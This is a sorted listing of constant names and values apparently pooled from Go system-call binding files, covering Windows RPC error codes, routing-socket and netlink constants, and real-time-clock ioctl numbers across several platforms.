RPC_S_INVALID_RPC_PROTSEQ                                                 syscall.Errno = 1704
RPC_S_INVALID_STRING_BINDING                                              syscall.Errno = 1700
RPC_S_INVALID_STRING_UUID                                                 syscall.Errno = 1705
RPC_S_INVALID_TAG                                                         syscall.Errno = 1733
RPC_S_INVALID_TIMEOUT                                                     syscall.Errno = 1709
RPC_S_INVALID_VERS_OPTION                                                 syscall.Errno = 1756
RPC_S_MAX_CALLS_TOO_SMALL                                                 syscall.Errno = 1742
RPC_S_NAME_SERVICE_UNAVAILABLE                                            syscall.Errno = 1762
RPC_S_NOTHING_TO_EXPORT                                                   syscall.Errno = 1754
RPC_S_NOT_ALL_OBJS_EXPORTED                                               syscall.Errno = 1923
RPC_S_NOT_ALL_OBJS_UNEXPORTED                                             syscall.Errno = 1758
RPC_S_NOT_CANCELLED                                                       syscall.Errno = 1826
RPC_S_NOT_LISTENING                                                       syscall.Errno = 1715
RPC_S_NOT_RPC_ERROR                                                       syscall.Errno = 1823
RPC_S_NO_BINDINGS                                                         syscall.Errno = 1718
RPC_S_NO_CALL_ACTIVE                                                      syscall.Errno = 1725
RPC_S_NO_CONTEXT_AVAILABLE                                                syscall.Errno = 1765
RPC_S_NO_ENDPOINT_FOUND                                                   syscall.Errno = 1708
RPC_S_NO_ENTRY_NAME                                                       syscall.Errno = 1735
RPC_S_NO_INTERFACES                                                       syscall.Errno = 1817
RPC_S_NO_MORE_BINDINGS                                                    syscall.Errno = 1806
RPC_S_NO_MORE_MEMBERS                                                     syscall.Errno = 1757
RPC_S_NO_PRINC_NAME                                                       syscall.Errno = 1822
RPC_S_NO_PROTSEQS                                                         syscall.Errno = 1719
RPC_S_NO_PROTSEQS_REGISTERED                                              syscall.Errno = 1714
RPC_S_OBJECT_NOT_FOUND                                                    syscall.Errno = 1710
RPC_S_OUT_OF_RESOURCES                                                    syscall.Errno = 1721
RPC_S_PRF_ELT_NOT_ADDED                                                   syscall.Errno = 1926
RPC_S_PRF_ELT_NOT_REMOVED                                                 syscall.Errno = 1927
RPC_S_PROCNUM_OUT_OF_RANGE                                                syscall.Errno = 1745
RPC_S_PROFILE_NOT_ADDED                                                   syscall.Errno = 1925
RPC_S_PROTOCOL_ERROR                                                      syscall.Errno = 1728
RPC_S_PROTSEQ_NOT_FOUND                                                   syscall.Errno = 1744
RPC_S_PROTSEQ_NOT_SUPPORTED                                               syscall.Errno = 1703
RPC_S_PROXY_ACCESS_DENIED                                                 syscall.Errno = 1729
RPC_S_SEC_PKG_ERROR                                                       syscall.Errno = 1825
RPC_S_SEND_INCOMPLETE                                                     syscall.Errno = 1913
RPC_S_SERVER_TOO_BUSY                                                     syscall.Errno = 1723
RPC_S_SERVER_UNAVAILABLE                                                  syscall.Errno = 1722
RPC_S_STRING_TOO_LONG                                                     syscall.Errno = 1743
RPC_S_SYSTEM_HANDLE_COUNT_EXCEEDED                                        syscall.Errno = 1835
RPC_S_SYSTEM_HANDLE_TYPE_MISMATCH                                         syscall.Errno = 1836
RPC_S_TYPE_ALREADY_REGISTERED                                             syscall.Errno = 1712
RPC_S_UNKNOWN_AUTHN_LEVEL                                                 syscall.Errno = 1748
RPC_S_UNKNOWN_AUTHN_SERVICE                                               syscall.Errno = 1747
RPC_S_UNKNOWN_AUTHN_TYPE                                                  syscall.Errno = 1741
RPC_S_UNKNOWN_AUTHZ_SERVICE                                               syscall.Errno = 1750
RPC_S_UNKNOWN_IF                                                          syscall.Errno = 1717
RPC_S_UNKNOWN_MGR_TYPE                                                    syscall.Errno = 1716
RPC_S_UNSUPPORTED_AUTHN_LEVEL                                             syscall.Errno = 1821
RPC_S_UNSUPPORTED_NAME_SYNTAX                                             syscall.Errno = 1737
RPC_S_UNSUPPORTED_TRANS_SYN                                               syscall.Errno = 1730
RPC_S_UNSUPPORTED_TYPE                                                    syscall.Errno = 1732
RPC_S_UUID_LOCAL_ONLY                                                     syscall.Errno = 1824
RPC_S_UUID_NO_ADDRESS                                                     syscall.Errno = 1739
RPC_S_WAITONTIMER                                                         Handle        = 0x80010116
RPC_S_WRONG_KIND_OF_BINDING                                               syscall.Errno = 1701
RPC_S_ZERO_DIVIDE                                                         syscall.Errno = 1767
RPC_X_BAD_STUB_DATA                                                       syscall.Errno = 1783
RPC_X_BYTE_COUNT_TOO_SMALL                                                syscall.Errno = 1782
RPC_X_ENUM_VALUE_OUT_OF_RANGE                                             syscall.Errno = 1781
RPC_X_INVALID_ES_ACTION                                                   syscall.Errno = 1827
RPC_X_INVALID_PIPE_OBJECT                                                 syscall.Errno = 1830
RPC_X_NO_MORE_ENTRIES                                                     syscall.Errno = 1772
RPC_X_NULL_REF_POINTER                                                    syscall.Errno = 1780
RPC_X_PIPE_CLOSED                                                         syscall.Errno = 1916
RPC_X_PIPE_DISCIPLINE_ERROR                                               syscall.Errno = 1917
RPC_X_PIPE_EMPTY                                                          syscall.Errno = 1918
RPC_X_SS_CANNOT_GET_CALL_HANDLE                                           syscall.Errno = 1779
RPC_X_SS_CHAR_TRANS_OPEN_FAIL                                             syscall.Errno = 1773
RPC_X_SS_CHAR_TRANS_SHORT_FILE                                            syscall.Errno = 1774
RPC_X_SS_CONTEXT_DAMAGED                                                  syscall.Errno = 1777
RPC_X_SS_HANDLES_MISMATCH                                                 syscall.Errno = 1778
RPC_X_SS_IN_NULL_CONTEXT                                                  syscall.Errno = 1775
RPC_X_WRONG_ES_VERSION                                                    syscall.Errno = 1828
RPC_X_WRONG_PIPE_ORDER                                                    syscall.Errno = 1831
RPC_X_WRONG_PIPE_VERSION                                                  syscall.Errno = 1832
RPC_X_WRONG_STUB_VERSION                                                  syscall.Errno = 1829
RTAX)_/ 
RTAX_ADVMSS                                 = 0x8
RTAX_AUTHOR                             = 0x6
RTAX_AUTHOR                       = 0x6
RTAX_AUTHOR                    = 0x6
RTAX_AUTHOR                   = 0x6
RTAX_BFD                          = 0xb
RTAX_BRD                                = 0x7
RTAX_BRD                          = 0x7
RTAX_BRD                       = 0x7
RTAX_BRD                      = 0x7
RTAX_CC_ALGO                                = 0x10
RTAX_CWND                                   = 0x7
RTAX_DNS                          = 0xc
RTAX_DST                                = 0x0
RTAX_DST                          = 0x0
RTAX_DST                       = 0x0
RTAX_DST                      = 0x0
RTAX_FASTOPEN_NO_COOKIE                     = 0x11
RTAX_FEATURES                               = 0xc
RTAX_FEATURE_ALLFRAG                        = 0x8
RTAX_FEATURE_ECN                            = 0x1
RTAX_FEATURE_MASK                           = 0xf
RTAX_FEATURE_SACK                           = 0x2
RTAX_FEATURE_TIMESTAMP                      = 0x4
RTAX_GATEWAY                            = 0x1
RTAX_GATEWAY                      = 0x1
RTAX_GATEWAY                   = 0x1
RTAX_GATEWAY                  = 0x1
RTAX_GENMASK                            = 0x3
RTAX_GENMASK                      = 0x3
RTAX_GENMASK                   = 0x3
RTAX_GENMASK                  = 0x3
RTAX_HOPLIMIT                               = 0xa
RTAX_IFA                                = 0x5
RTAX_IFA                          = 0x5
RTAX_IFA                       = 0x5
RTAX_IFA                      = 0x5
RTAX_IFP                                = 0x4
RTAX_IFP                          = 0x4
RTAX_IFP                       = 0x4
RTAX_IFP                      = 0x4
RTAX_INITCWND                               = 0xb
RTAX_INITRWND                               = 0xe
RTAX_LABEL                        = 0xa
RTAX_LOCK                                   = 0x1
RTAX_MAX                                    = 0x11
RTAX_MAX                                = 0x8
RTAX_MAX                          = 0x9
RTAX_MAX                          = 0xb
RTAX_MAX                          = 0xf
RTAX_MAX                       = 0x8
RTAX_MAX                      = 0x8
RTAX_MAX                      = 0x9
RTAX_MPLS1                        = 0x8
RTAX_MPLS2                        = 0x9
RTAX_MPLS3                        = 0xa
RTAX_MTU                                    = 0x2
RTAX_NETMASK                            = 0x2
RTAX_NETMASK                      = 0x2
RTAX_NETMASK                   = 0x2
RTAX_NETMASK                  = 0x2
RTAX_QUICKACK                               = 0xf
RTAX_REORDERING                             = 0x9
RTAX_RTO_MIN                                = 0xd
RTAX_RTT                                    = 0x4
RTAX_RTTVAR                                 = 0x5
RTAX_SEARCH                       = 0xe
RTAX_SRC                          = 0x8
RTAX_SRC                      = 0x8
RTAX_SRCMASK                      = 0x9
RTAX_SSTHRESH                               = 0x6
RTAX_STATIC                       = 0xd
RTAX_TAG                          = 0x8
RTAX_UNSPEC                                 = 0x0
RTAX_WINDOW                                 = 0x3
RTA_ALIGNTO                                 = 0x4
RTA_AUTHOR                              = 0x40
RTA_AUTHOR                        = 0x40
RTA_AUTHOR                     = 0x40
RTA_AUTHOR                    = 0x40
RTA_BFD                           = 0x800
RTA_BRD                                 = 0x80
RTA_BRD                           = 0x80
RTA_BRD                        = 0x80
RTA_BRD                       = 0x80
RTA_CACHEINFO      = 0xc
RTA_DNS                           = 0x1000
RTA_DOWNSTREAM                = 0x100
RTA_DPORT          = 0x1d
RTA_DST                                 = 0x1
RTA_DST                           = 0x1
RTA_DST                        = 0x1
RTA_DST                       = 0x1
RTA_DST            = 0x1
RTA_ENCAP          = 0x16
RTA_ENCAP_TYPE     = 0x15
RTA_EXPIRES        = 0x17
RTA_FLOW           = 0xb
RTA_GATEWAY                             = 0x2
RTA_GATEWAY                       = 0x2
RTA_GATEWAY                    = 0x2
RTA_GATEWAY                   = 0x2
RTA_GATEWAY        = 0x5
RTA_GENMASK                             = 0x8
RTA_GENMASK                       = 0x8
RTA_GENMASK                    = 0x8
RTA_GENMASK                   = 0x8
RTA_IFA                                 = 0x20
RTA_IFA                           = 0x20
RTA_IFA                        = 0x20
RTA_IFA                       = 0x20
RTA_IFP                                 = 0x10
RTA_IFP                           = 0x10
RTA_IFP                        = 0x10
RTA_IFP                       = 0x10
RTA_IIF            = 0x3
RTA_IP_PROTO       = 0x1b
RTA_LABEL                         = 0x400
RTA_MARK           = 0x10
RTA_MAX                                     = 0x1e
RTA_METRICS        = 0x8
RTA_MFC_STATS      = 0x11
RTA_MPLS1                         = 0x100
RTA_MPLS2                         = 0x200
RTA_MPLS3                         = 0x400
RTA_MULTIPATH      = 0x9
RTA_NETMASK                             = 0x4
RTA_NETMASK                       = 0x4
RTA_NETMASK                    = 0x4
RTA_NETMASK                   = 0x4
RTA_NEWDST         = 0x13
RTA_NUMBITS                   = 0x9
RTA_OIF            = 0x4
RTA_PAD            = 0x18
RTA_PREF           = 0x14
RTA_PREFSRC        = 0x7
RTA_PRIORITY       = 0x6
RTA_SEARCH                        = 0x4000
RTA_SPORT          = 0x1c
RTA_SRC                           = 0x100
RTA_SRC                       = 0x100
RTA_SRC            = 0x2
RTA_SRCMASK                       = 0x200
RTA_STATIC                        = 0x2000
RTA_TABLE          = 0xf
RTA_TAG                           = 0x100
RTA_TTL_PROPAGATE  = 0x1a
RTA_UID            = 0x19
RTA_UNSPEC         = 0x0
RTA_VIA            = 0x12
RTCF
RTCF_DIRECTSRC                              = 0x4000000
RTCF_DOREDIRECT                             = 0x1000000
RTCF_LOG                                    = 0x2000000
RTCF_MASQ                                   = 0x400000
RTCF_NAT                                    = 0x800000
RTCF_VALVE                                  = 0x200000
RTCTime) error {
RTCWkAlrm) error {
RTC_AF                                      = 0x20
RTC_AIE_OFF                      = 0x20007002
RTC_AIE_OFF                      = 0x7002
RTC_AIE_ON                       = 0x20007001
RTC_AIE_ON                       = 0x7001
RTC_ALM_READ                     = 0x40247008
RTC_ALM_READ                     = 0x80247008
RTC_ALM_SET                      = 0x40247007
RTC_ALM_SET                      = 0x80247007
RTC_BSM_DIRECT                              = 0x1
RTC_BSM_DISABLED                            = 0x0
RTC_BSM_LEVEL                               = 0x2
RTC_BSM_STANDBY                             = 0x3
RTC_EPOCH_READ                   = 0x4004700d
RTC_EPOCH_READ                   = 0x4008700d
RTC_EPOCH_READ                   = 0x8004700d
RTC_EPOCH_READ                   = 0x8008700d
RTC_EPOCH_SET                    = 0x4004700e
RTC_EPOCH_SET                    = 0x4008700e
RTC_EPOCH_SET                    = 0x8004700e
RTC_EPOCH_SET                    = 0x8008700e
RTC_FEATURE_ALARM                           = 0x0
RTC_FEATURE_ALARM_RES_2S                    = 0x3
RTC_FEATURE_ALARM_RES_MINUTE                = 0x1
RTC_FEATURE_ALARM_WAKEUP_ONLY               = 0x7
RTC_FEATURE_BACKUP_SWITCH_MODE              = 0x6
RTC_FEATURE_CNT                             = 0x8
RTC_FEATURE_CORRECTION                      = 0x5
RTC_FEATURE_NEED_WEEK_DAY                   = 0x2
RTC_FEATURE_UPDATE_INTERRUPT                = 0x4
RTC_IA64                      = 0x3
RTC_IRQF                                    = 0x80
RTC_IRQP_READ                    = 0x4004700b
RTC_IRQP_READ                    = 0x4008700b
RTC_IRQP_READ                    = 0x8004700b
RTC_IRQP_READ                    = 0x8008700b
RTC_IRQP_SET                     = 0x4004700c
RTC_IRQP_SET                     = 0x4008700c
RTC_IRQP_SET                     = 0x8004700c
RTC_IRQP_SET                     = 0x8008700c
RTC_MAX_FREQ                                = 0x2000
RTC_PARAM_BACKUP_SWITCH_MODE                = 0x2
RTC_PARAM_CORRECTION                        = 0x1
RTC_PARAM_FEATURES                          = 0x0
RTC_PARAM_GET                    = 0x40187013
RTC_PARAM_GET                    = 0x80187013
RTC_PARAM_SET                    = 0x40187014
RTC_PARAM_SET                    = 0x80187014
RTC_PF                                      = 0x40
RTC_PIE_OFF                      = 0x20007006
RTC_PIE_OFF                      = 0x7006
RTC_PIE_ON                       = 0x20007005
RTC_PIE_ON                       = 0x7005
RTC_PLL_GET                      = 0x401c7011
RTC_PLL_GET                      = 0x40207011
RTC_PLL_GET                      = 0x801c7011
RTC_PLL_GET                      = 0x80207011
RTC_PLL_SET                      = 0x401c7012
RTC_PLL_SET                      = 0x40207012
RTC_PLL_SET                      = 0x801c7012
RTC_PLL_SET                      = 0x80207012
RTC_POWER                     = 0x1
RTC_POWER_PC                  = 0x2
RTC_RD_TIME                      = 0x40247009
RTC_RD_TIME                      = 0x80247009
RTC_SET_TIME                     = 0x4024700a
RTC_SET_TIME                     = 0x8024700a
RTC_UF                                      = 0x10
RTC_UIE_OFF                      = 0x20007004
RTC_UIE_OFF                      = 0x7004
RTC_UIE_ON                       = 0x20007003
RTC_UIE_ON                       = 0x7003
RTC_VL_(ACCURACY
RTC_VL_CLR                       = 0x20007014
RTC_VL_CLR                       = 0x7014
RTC_VL_READ                      = 0x40047013
RTC_VL_READ                      = 0x80047013
RTC_WIE_OFF                      = 0x20007010
RTC_WIE_OFF                      = 0x7010
RTC_WIE_ON                       = 0x2000700f
RTC_WIE_ON                       = 0x700f
RTC_WKALM_RD                     = 0x40287010
RTC_WKALM_RD                     = 0x80287010
RTC_WKALM_SET                    = 0x4028700f
RTC_WKALM_SET                    = 0x8028700f
RTF_ACTIVE_DGD                = 0x1000000
RTF_ADDRCLASSMASK                           = 0xf8000000
RTF_ADDRCONF                                = 0x40000
RTF_ALLONLINK                               = 0x20000
RTF_ANNOUNCE                      = 0x20000
RTF_ANNOUNCE                      = 0x4000
RTF_BCE                       = 0x80000
RTF_BFD                           = 0x1000000
RTF_BLACKHOLE                           = 0x1000
RTF_BLACKHOLE                     = 0x1000
RTF_BLACKHOLE                  = 0x1000
RTF_BLACKHOLE                 = 0x1000
RTF_BROADCAST                               = 0x10000000
RTF_BROADCAST                           = 0x400000
RTF_BROADCAST                     = 0x400000
RTF_BROADCAST                  = 0x400000
RTF_BROADCAST                 = 0x400000
RTF_BUL                       = 0x2000
RTF_CACHE                                   = 0x1000000
RTF_CACHED                        = 0x20000
RTF_CLONE                     = 0x10000
RTF_CLONED                        = 0x10000
RTF_CLONED                        = 0x2000
RTF_CLONED                    = 0x20000
RTF_CLONING                             = 0x100
RTF_CLONING                       = 0x100
RTF_CLONING                   = 0x100
RTF_CONDEMNED                           = 0x2000000
RTF_CONNECTED                     = 0x800000
RTF_DEAD                                = 0x20000000
RTF_DEFAULT                                 = 0x10000
RTF_DELCLONE                            = 0x80
RTF_DONE                                = 0x40
RTF_DONE                          = 0x40
RTF_DONE                       = 0x40
RTF_DONE                      = 0x40
RTF_DYNAMIC                                 = 0x10
RTF_DYNAMIC                             = 0x10
RTF_DYNAMIC                       = 0x10
RTF_DYNAMIC                    = 0x10
RTF_DYNAMIC                   = 0x10
RTF_FIXEDMTU                   = 0x80000
RTF_FLOW                                    = 0x2000000
RTF_FMASK                         = 0x10f808
RTF_FMASK                         = 0x110fc08
RTF_FMASK                         = 0x70f808
RTF_FMASK                      = 0x1004d808
RTF_FREE_IN_PROG              = 0x4000000
RTF_GATEWAY                                 = 0x2
RTF_GATEWAY                             = 0x2
RTF_GATEWAY                       = 0x2
RTF_GATEWAY                    = 0x2
RTF_GATEWAY                   = 0x2
RTF_GLOBAL                              = 0x40000000
RTF_GWFLAG_COMPAT              = 0x80000000
RTF_HOST                                    = 0x4
RTF_HOST                                = 0x4
RTF_HOST                          = 0x4
RTF_HOST                       = 0x4
RTF_HOST                      = 0x4
RTF_IFREF                               = 0x4000000
RTF_IFSCOPE                             = 0x1000000
RTF_INDIRECT                  = 0x40000
RTF_INTERFACE                               = 0x40000000
RTF_IRTT                                    = 0x100
RTF_KERNEL                    = 0x80000
RTF_LINKRT                                  = 0x100000
RTF_LLDATA                              = 0x400
RTF_LLDATA                     = 0x400
RTF_LLINFO                              = 0x400
RTF_LLINFO                        = 0x400
RTF_LLINFO                     = 0x400
RTF_LLINFO                    = 0x400
RTF_LOCAL                                   = 0x80000000
RTF_LOCAL                               = 0x200000
RTF_LOCAL                         = 0x200000
RTF_LOCAL                      = 0x200000
RTF_LOCAL                     = 0x200000
RTF_MASK                          = 0x80
RTF_MASK                      = 0x80
RTF_MODIFIED                                = 0x20
RTF_MODIFIED                            = 0x20
RTF_MODIFIED                      = 0x20
RTF_MODIFIED                   = 0x20
RTF_MODIFIED                  = 0x20
RTF_MPATH                         = 0x40000
RTF_MPLS                          = 0x100000
RTF_MPLSOPS                       = 0x1000000
RTF_MSS                                     = 0x40
RTF_MTU                                     = 0x40
RTF_MULTICAST                               = 0x20000000
RTF_MULTICAST                           = 0x800000
RTF_MULTICAST                     = 0x200
RTF_MULTICAST                     = 0x800000
RTF_MULTICAST                  = 0x800000
RTF_MULTICAST                 = 0x800000
RTF_MULTIRT                   = 0x10000
RTF_NAT                                     = 0x8000000
RTF_NOFORWARD                               = 0x1000
RTF_NOIFREF                             = 0x2000
RTF_NONEXTHOP                               = 0x200000
RTF_NOPMTUDISC                              = 0x4000
RTF_PERMANENT6                = 0x8000000
RTF_PERMANENT_ARP                 = 0x2000
RTF_PINNED                              = 0x100000
RTF_PINNED                        = 0x100000
RTF_PINNED                     = 0x100000
RTF_PINNED                    = 0x100000
RTF_POLICY                                  = 0x4000000
RTF_PRCLONING                           = 0x10000
RTF_PRCLONING                     = 0x10000
RTF_PRCLONING   = 0x10000
RTF_PRIVATE                   = 0x2000
RTF_PROTO1                              = 0x8000
RTF_PROTO1                        = 0x8000
RTF_PROTO1                     = 0x8000
RTF_PROTO1                    = 0x8000
RTF_PROTO2                              = 0x4000
RTF_PROTO2                        = 0x4000
RTF_PROTO2                     = 0x4000
RTF_PROTO2                    = 0x4000
RTF_PROTO3                              = 0x40000
RTF_PROTO3                        = 0x2000
RTF_PROTO3                        = 0x40000
RTF_PROTO3                     = 0x40000
RTF_PROTO3                    = 0x40000
RTF_PROXY                               = 0x8000000
RTF_REINSTATE                               = 0x8
RTF_REJECT                                  = 0x200
RTF_REJECT                              = 0x8
RTF_REJECT                        = 0x8
RTF_REJECT                     = 0x8
RTF_REJECT                    = 0x8
RTF_RNH_LOCKED                 = 0x40000000
RTF_ROUTER                              = 0x10000000
RTF_SETSRC                    = 0x20000
RTF_SMALLMTU                  = 0x40000
RTF_SOURCE                        = 0x20000
RTF_SRC                           = 0x10000
RTF_STATIC                                  = 0x400
RTF_STATIC                              = 0x800
RTF_STATIC                        = 0x800
RTF_STATIC                     = 0x800
RTF_STATIC                    = 0x800
RTF_STICKY                     = 0x10000000
RTF_STOPSRCH                  = 0x2000000
RTF_THROW                                   = 0x2000
RTF_TUNNEL                        = 0x100000
RTF_UNREACHABLE               = 0x10000000
RTF_UP                                      = 0x1
RTF_UP                                  = 0x1
RTF_UP                            = 0x1
RTF_UP                         = 0x1
RTF_UP                        = 0x1
RTF_USETRAILERS                   = 0x8000
RTF_WASCLONED                           = 0x20000
RTF_WASCLONED                     = 0x20000
RTF_WINDOW                                  = 0x80
RTF_XRESOLVE                                = 0x800
RTF_XRESOLVE                            = 0x200
RTF_XRESOLVE                      = 0x200
RTF_XRESOLVE                   = 0x200
RTF_XRESOLVE                  = 0x200
RTF_ZONE                      = 0x100000
RTLP_CURDIR_REF
RTL_RELATIVE_NAME) (ntstatus error) = ntdll.RtlDosPathNameToNtPathName_U_WithStatus
RTL_RELATIVE_NAME) (ntstatus error) = ntdll.RtlDosPathNameToRelativeNtPathName_U_WithStatus
RTL_RELATIVE_NAME) (ntstatus error) {
RTL_USER_PROCESS_PARAMETERS
RTM(GRP)
RTMGRP_DECnet_IFADDR                        = 0x1000
RTMGRP_DECnet_ROUTE                         = 0x4000
RTMGRP_IPV4_IFADDR                          = 0x10
RTMGRP_IPV4_MROUTE                          = 0x20
RTMGRP_IPV4_ROUTE                           = 0x40
RTMGRP_IPV4_RULE                            = 0x80
RTMGRP_IPV6_IFADDR                          = 0x100
RTMGRP_IPV6_IFINFO                          = 0x800
RTMGRP_IPV6_MROUTE                          = 0x200
RTMGRP_IPV6_PREFIX                          = 0x20000
RTMGRP_IPV6_ROUTE                           = 0x400
RTMGRP_LINK                                 = 0x1
RTMGRP_NEIGH                                = 0x4
RTMGRP_NOTIFY                               = 0x2
RTMGRP_TC                                   = 0x8
RTM_80211INFO                     = 0x15
RTM_ADD                                 = 0x1
RTM_ADD                           = 0x1
RTM_ADD                        = 0x1
RTM_ADD                       = 0x1
RTM_BASE                                    = 0x10
RTM_BFD                           = 0x12
RTM_CHANGE                              = 0x3
RTM_CHANGE                        = 0x3
RTM_CHANGE                     = 0x3
RTM_CHANGE                    = 0x3
RTM_CHGADDR                       = 0x15
RTM_CHGADDR                   = 0xf
RTM_CHGADDRATTR                   = 0x14
RTM_DELACTION                               = 0x31
RTM_DELADDR                                 = 0x15
RTM_DELADDR                             = 0xd
RTM_DELADDR                       = 0xd
RTM_DELADDR                    = 0xd
RTM_DELADDR                   = 0xd
RTM_DELADDRLABEL                            = 0x49
RTM_DELCHAIN                                = 0x65
RTM_DELETE                              = 0x2
RTM_DELETE                        = 0x2
RTM_DELETE                     = 0x2
RTM_DELETE                    = 0x2
RTM_DELLINK                                 = 0x11
RTM_DELLINKPROP                             = 0x6d
RTM_DELMADDR                            = 0x10
RTM_DELMADDR                      = 0x10
RTM_DELMADDR                   = 0x10
RTM_DELMDB                                  = 0x55
RTM_DELNEIGH                                = 0x1d
RTM_DELNETCONF                              = 0x51
RTM_DELNEXTHOP                              = 0x69
RTM_DELNEXTHOPBUCKET                        = 0x75
RTM_DELNSID                                 = 0x59
RTM_DELQDISC                                = 0x25
RTM_DELROUTE                                = 0x19
RTM_DELRULE                                 = 0x21
RTM_DELTCLASS                               = 0x29
RTM_DELTFILTER                              = 0x2d
RTM_DELTUNNEL                               = 0x79
RTM_DELVLAN                                 = 0x71
RTM_DESYNC                        = 0x10
RTM_EXPIRE                    = 0xf
RTM_FREEADDR                  = 0x10
RTM_F_CLONED                                = 0x200
RTM_F_EQUALIZE                              = 0x400
RTM_F_FIB_MATCH                             = 0x2000
RTM_F_LOOKUP_TABLE                          = 0x1000
RTM_F_NOTIFY                                = 0x100
RTM_F_OFFLOAD                               = 0x4000
RTM_F_OFFLOAD_FAILED                        = 0x20000000
RTM_F_PREFIX                                = 0x800
RTM_F_TRAP                                  = 0x8000
RTM_GET                                 = 0x4
RTM_GET                           = 0x4
RTM_GET                        = 0x4
RTM_GET                       = 0x4
RTM_GET2                                = 0x14
RTM_GETACTION                               = 0x32
RTM_GETADDR                                 = 0x16
RTM_GETADDRLABEL                            = 0x4a
RTM_GETANYCAST                              = 0x3e
RTM_GETCHAIN                                = 0x66
RTM_GETDCB                                  = 0x4e
RTM_GETLINK                                 = 0x12
RTM_GETLINKPROP                             = 0x6e
RTM_GETMDB                                  = 0x56
RTM_GETMULTICAST                            = 0x3a
RTM_GETNEIGH                                = 0x1e
RTM_GETNEIGHTBL                             = 0x42
RTM_GETNETCONF                              = 0x52
RTM_GETNEXT                   = 0x11
RTM_GETNEXTHOP                              = 0x6a
RTM_GETNEXTHOPBUCKET                        = 0x76
RTM_GETNSID                                 = 0x5a
RTM_GETQDISC                                = 0x26
RTM_GETROUTE                                = 0x1a
RTM_GETRULE                                 = 0x22
RTM_GETSTATS                                = 0x5e
RTM_GETTCLASS                               = 0x2a
RTM_GETTFILTER                              = 0x2e
RTM_GETTUNNEL                               = 0x7a
RTM_GETVLAN                                 = 0x72
RTM_IEEE80211                     = 0x11
RTM_IEEE80211                     = 0x12
RTM_IEEE80211                  = 0x12
RTM_IFANNOUNCE                    = 0x10
RTM_IFANNOUNCE                    = 0x11
RTM_IFANNOUNCE                    = 0xf
RTM_IFANNOUNCE                 = 0x11
RTM_IFINFO                              = 0xe
RTM_IFINFO                        = 0x14
RTM_IFINFO                        = 0xe
RTM_IFINFO                     = 0xe
RTM_IFINFO                    = 0xe
RTM_IFINFO2                             = 0x12
RTM_INVALIDATE                    = 0x11
RTM_LLINFO_UPD                    = 0x13
RTM_LOCK                                = 0x8
RTM_LOCK                          = 0x8
RTM_LOCK                       = 0x8
RTM_LOCK                      = 0x8
RTM_LOSING                              = 0x5
RTM_LOSING                        = 0x5
RTM_LOSING                     = 0x5
RTM_LOSING                    = 0x5
RTM_MAX                                     = 0x7b
RTM_MAXSIZE                       = 0x800
RTM_MISS                                = 0x7
RTM_MISS                          = 0x7
RTM_MISS                       = 0x7
RTM_MISS                      = 0x7
RTM_NEWACTION                               = 0x30
RTM_NEWADDR                                 = 0x14
RTM_NEWADDR                             = 0xc
RTM_NEWADDR                       = 0xc
RTM_NEWADDR                    = 0xc
RTM_NEWADDR                   = 0xc
RTM_NEWADDRLABEL                            = 0x48
RTM_NEWCACHEREPORT                          = 0x60
RTM_NEWCHAIN                                = 0x64
RTM_NEWLINK                                 = 0x10
RTM_NEWLINKPROP                             = 0x6c
RTM_NEWMADDR                            = 0xf
RTM_NEWMADDR                      = 0xf
RTM_NEWMADDR                   = 0xf
RTM_NEWMADDR2                           = 0x13
RTM_NEWMDB                                  = 0x54
RTM_NEWNDUSEROPT                            = 0x44
RTM_NEWNEIGH                                = 0x1c
RTM_NEWNEIGHTBL                             = 0x40
RTM_NEWNETCONF                              = 0x50
RTM_NEWNEXTHOP                              = 0x68
RTM_NEWNEXTHOPBUCKET                        = 0x74
RTM_NEWNSID                                 = 0x58
RTM_NEWNVLAN                                = 0x70
RTM_NEWPREFIX                               = 0x34
RTM_NEWQDISC                                = 0x24
RTM_NEWROUTE                                = 0x18
RTM_NEWRULE                                 = 0x20
RTM_NEWSTATS                                = 0x5c
RTM_NEWTCLASS                               = 0x28
RTM_NEWTFILTER                              = 0x2c
RTM_NEWTUNNEL                               = 0x78
RTM_NR_FAMILIES                             = 0x1b
RTM_NR_MSGTYPES                             = 0x6c
RTM_OIFINFO                       = 0xf
RTM_OLDADD                              = 0x9
RTM_OLDADD                        = 0x9
RTM_OLDADD                    = 0x9
RTM_OLDADD      = 0x9
RTM_OLDDEL                              = 0xa
RTM_OLDDEL                        = 0xa
RTM_OLDDEL                    = 0xa
RTM_OLDDEL      = 0xa
RTM_OOIFINFO                      = 0xe
RTM_PROPOSAL                      = 0x13
RTM_REDIRECT                            = 0x6
RTM_REDIRECT                      = 0x6
RTM_REDIRECT                   = 0x6
RTM_REDIRECT                  = 0x6
RTM_RESOLVE                             = 0xb
RTM_RESOLVE                       = 0xb
RTM_RESOLVE                    = 0xb
RTM_RESOLVE                   = 0xb
RTM_RTLOST                    = 0x10
RTM_RTTUNIT                             = 0xf4240
RTM_RTTUNIT                       = 0xf4240
RTM_RTTUNIT                    = 0xf4240
RTM_RTTUNIT                   = 0xf4240
RTM_SAMEADDR                  = 0x12
RTM_SET                       = 0x13
RTM_SETDCB                                  = 0x4f
RTM_SETGATE                       = 0x12
RTM_SETLINK                                 = 0x13
RTM_SETNEIGHTBL                             = 0x43
RTM_SETSTATS                                = 0x5f
RTM_VERSION                             = 0x5
RTM_VERSION                       = 0x4
RTM_VERSION                       = 0x5
RTM_VERSION                       = 0x7
RTM_VERSION                    = 0x5
RTM_VERSION                   = 0x2
RTM_VERSION                   = 0x3
RTM_VERSION_GR                = 0x4
RTM_VERSION_GR_COMPAT         = 0x3
RTM_VERSION_POLICY            = 0x5
RTM_VERSION_POLICY_EXT        = 0x6
RTM_VERSION_POLICY_PRFN       = 0x7
RTNH
RTNH_ALIGNTO                                = 0x4
RTNH_COMPARE_MASK                           = 0x59
RTNH_F_DEAD                                 = 0x1
RTNH_F_LINKDOWN                             = 0x10
RTNH_F_OFFLOAD                              = 0x8
RTNH_F_ONLINK                               = 0x4
RTNH_F_PERVASIVE                            = 0x2
RTNH_F_TRAP                                 = 0x40
RTNH_F_UNRESOLVED                           = 0x20
RTNLGRP_BRVLAN        = 0x21
RTNLGRP_DCB           = 0x17
RTNLGRP_DECnet_IFADDR = 0xd
RTNLGRP_DECnet_ROUTE  = 0xf
RTNLGRP_DECnet_RULE   = 0x10
RTNLGRP_IPV4_IFADDR   = 0x5
RTNLGRP_IPV4_MROUTE   = 0x6
RTNLGRP_IPV4_MROUTE_R = 0x1e
RTNLGRP_IPV4_NETCONF  = 0x18
RTNLGRP_IPV4_ROUTE    = 0x7
RTNLGRP_IPV4_RULE     = 0x8
RTNLGRP_IPV6_IFADDR   = 0x9
